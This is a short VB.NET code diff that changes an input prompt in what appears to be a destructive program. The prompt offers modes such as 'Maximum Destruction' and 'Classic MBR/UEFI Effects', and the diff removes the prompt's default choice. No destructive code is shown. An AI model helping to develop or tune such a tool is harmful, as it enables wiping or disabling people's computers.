@@ -717,8 +717,8 @@ Public Class Form2
     Public Function PromptUserForChoice(message As String, options As String()) As String
         Dim choice As String = String.Empty
 
-        ' Prompt the user for a choice with the first option as the default
-        choice = InputBox("Select your choice: (Maximum Destruction, Classic MBR/UEFI Effects, Surprise Me, Just Make Unusable My PC Without Destruction)", "User Choice", options(0))
+        ' Prompt the user for a choice with the first option as the default (only if they type something)
+        choice = InputBox("Select your choice: (Maximum Destruction, Classic MBR/UEFI Effects, Surprise Me, Just Make Unusable My PC Without Destruction)", "User Choice", "")
 
         ' Check if the user pressed Cancel or left the input blank
         If String.IsNullOrEmpty(choice) Then
